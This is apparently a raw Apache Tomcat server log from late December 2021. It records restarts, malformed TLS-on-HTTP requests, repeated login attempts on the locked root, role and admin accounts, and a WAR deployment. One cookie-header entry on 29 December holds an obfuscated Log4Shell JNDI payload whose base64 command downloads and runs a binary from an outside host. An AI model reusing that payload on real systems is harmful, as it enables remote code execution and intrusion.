+25-Dec-2021 15:52:39.574 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 15:52:39.577 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 15:52:39.577 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+25-Dec-2021 15:52:39.577 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+25-Dec-2021 15:52:39.992 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 15:52:40.074 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+25-Dec-2021 15:52:40.145 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 2854 ms
+25-Dec-2021 15:52:40.305 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+25-Dec-2021 15:52:40.309 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+25-Dec-2021 15:52:40.361 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+25-Dec-2021 15:52:41.481 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [1,106] ms
+25-Dec-2021 15:52:41.482 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+25-Dec-2021 15:52:41.573 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [92] ms
+25-Dec-2021 15:52:41.576 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+25-Dec-2021 15:52:42.577 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [1,001] ms
+25-Dec-2021 15:52:42.579 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+25-Dec-2021 15:52:42.658 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [79] ms
+25-Dec-2021 15:52:42.659 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+25-Dec-2021 15:52:42.773 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [114] ms
+25-Dec-2021 15:52:42.787 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 15:52:42.821 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 2674 ms
+25-Dec-2021 17:07:51.387 INFO [Thread-4] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 17:07:51.667 INFO [Thread-4] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+25-Dec-2021 17:07:52.973 INFO [Thread-4] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 17:07:53.375 INFO [Thread-4] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 17:27:52.324 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+25-Dec-2021 17:27:52.328 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+25-Dec-2021 17:27:52.328 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+25-Dec-2021 17:27:52.329 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+25-Dec-2021 17:27:52.329 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1022-aws
+25-Dec-2021 17:27:52.329 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+25-Dec-2021 17:27:52.330 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+25-Dec-2021 17:27:52.330 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-8u312-b07-0ubuntu1~20.04-b07
+25-Dec-2021 17:27:52.332 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+25-Dec-2021 17:27:52.333 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 17:27:52.333 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 17:27:52.334 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+25-Dec-2021 17:27:52.334 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+25-Dec-2021 17:27:52.334 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+25-Dec-2021 17:27:52.335 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+25-Dec-2021 17:27:52.336 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+25-Dec-2021 17:27:52.336 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+25-Dec-2021 17:27:52.336 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 17:27:52.338 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 17:27:52.339 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+25-Dec-2021 17:27:52.339 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+25-Dec-2021 17:27:52.544 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 17:27:52.580 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+25-Dec-2021 17:27:52.610 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1383 ms
+25-Dec-2021 17:27:52.688 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+25-Dec-2021 17:27:52.688 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+25-Dec-2021 17:27:52.720 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+25-Dec-2021 17:27:53.264 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [543] ms
+25-Dec-2021 17:27:53.264 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+25-Dec-2021 17:27:53.305 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [41] ms
+25-Dec-2021 17:27:53.305 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+25-Dec-2021 17:27:53.796 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [491] ms
+25-Dec-2021 17:27:53.797 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+25-Dec-2021 17:27:53.837 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [40] ms
+25-Dec-2021 17:27:53.837 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+25-Dec-2021 17:27:53.894 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [57] ms
+25-Dec-2021 17:27:53.898 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 17:27:53.912 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1301 ms
+25-Dec-2021 20:30:11.475 INFO [http-nio-8081-exec-6] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8a0x010x000x000x860x030x030x820x960xf90xf90xe30xef0xb60xffe[C70x190xbd0x160x9dn0xff0xf70x1b4<0xb20xc10x020x85C0xa40xa70xbfFg0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00C0x000x000x000x110x000x0f0x000x000x0c35.183.45.680x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+26-Dec-2021 05:54:17.070 INFO [http-nio-8081-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xaf0x010x000x000xab0x030x030xb10x0d0x8c0xc6O2$?0x7f0xaf0x190xa12!0xae0xb90x0a0x80G0xa30x910x1ds|0x9d0xea`0x8c0x120xb90x140x070x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00h3t0x000x000x000x000x000x110x000x0f0x000x000x0c35.183.45.680x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x100x000x0e0x040x010x040x030x020x010x020x030x040x010x050x010x060x010xff0x010x000x010x000x000x100x000x170x000x150x02h20x08http/1.10x08spdy/3.1...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+27-Dec-2021 06:42:21.727 INFO [http-nio-8081-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8a0x010x000x000x860x030x030x0f0xbb<0x85&0xec.0x980xba0xda0xb90xf4E0x840xcf0x9cA0xe30xc00x190xa70xdd0xda0xba0xfc0x0a/v0xca0xb4F0x020x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00C0x000x000x000x110x000x0f0x000x000x0c35.183.45.680x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+28-Dec-2021 14:22:48.050 INFO [http-nio-8081-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x050x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+28-Dec-2021 14:24:11.136 INFO [http-nio-8081-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x040x010x00P0x050xbc0xd20xe30x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+28-Dec-2021 16:32:27.401 WARNING [http-nio-8081-exec-2] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+28-Dec-2021 16:32:27.560 WARNING [http-nio-8081-exec-10] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+28-Dec-2021 16:32:27.719 WARNING [http-nio-8081-exec-9] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+28-Dec-2021 16:32:28.516 WARNING [http-nio-8081-exec-7] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+28-Dec-2021 16:32:28.677 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+28-Dec-2021 16:32:28.836 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+28-Dec-2021 16:32:29.629 WARNING [http-nio-8081-exec-8] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+28-Dec-2021 16:32:29.788 WARNING [http-nio-8081-exec-1] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+28-Dec-2021 16:32:29.946 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+28-Dec-2021 16:33:17.078 INFO [http-nio-8081-exec-7] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/jsp_app.war]
+28-Dec-2021 16:33:17.915 INFO [http-nio-8081-exec-7] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/jsp_app.war] has finished in [836] ms
+29-Dec-2021 07:52:46.902 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:47.103 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:47.304 WARNING [http-nio-8081-exec-2] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:48.305 WARNING [http-nio-8081-exec-1] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:48.504 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:48.704 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:49.705 WARNING [http-nio-8081-exec-4] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 07:52:49.905 WARNING [http-nio-8081-exec-8] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 07:52:50.105 WARNING [http-nio-8081-exec-1] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 11:04:14.408 INFO [http-nio-8081-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xaf0x010x000x000xab0x030x030xdc~t0xb20xfc0xf20x9c00x0e0x9a0xbd0xbb0x9b0xd80xa2qq.0xf20xb70xde'B0xfey0x88 ]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+29-Dec-2021 18:05:37.895 INFO [http-nio-8081-exec-9] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/Deserialization/CommonsCollectionsK2/Command/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}')] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+29-Dec-2021 22:03:52.438 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:52.598 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:52.756 WARNING [http-nio-8081-exec-2] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:53.546 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:53.704 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:53.863 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:54.658 WARNING [http-nio-8081-exec-8] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 22:03:54.816 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 22:03:54.974 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 23:01:22.757 INFO [http-nio-8081-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8a0x010x000x000x860x030x03[C*0x180xf4a0xdb0x0d0xd40xd4ny0xd30x860xb70xa450xe8bR0xda0x130x130xbd0x7f0xb30x930xf80x0e0x880x8ce0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00C0x000x000x000x110x000x0f0x000x000x0c35.183.45.680x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+30-Dec-2021 12:16:14.548 WARNING [http-nio-8081-exec-10] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+30-Dec-2021 12:16:14.707 WARNING [http-nio-8081-exec-9] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+30-Dec-2021 12:16:14.866 WARNING [http-nio-8081-exec-4] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+30-Dec-2021 12:16:15.659 WARNING [http-nio-8081-exec-10] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+30-Dec-2021 12:16:15.818 WARNING [http-nio-8081-exec-9] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+30-Dec-2021 12:16:15.977 WARNING [http-nio-8081-exec-4] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+30-Dec-2021 12:16:16.773 WARNING [http-nio-8081-exec-10] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+30-Dec-2021 12:16:16.932 WARNING [http-nio-8081-exec-9] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+30-Dec-2021 12:16:17.093 WARNING [http-nio-8081-exec-4] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+31-Dec-2021 01:49:25.076 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+31-Dec-2021 01:49:25.084 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+31-Dec-2021 01:49:25.084 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+31-Dec-2021 01:49:25.084 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1022-aws
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-8u312-b07-0ubuntu1~20.04-b07
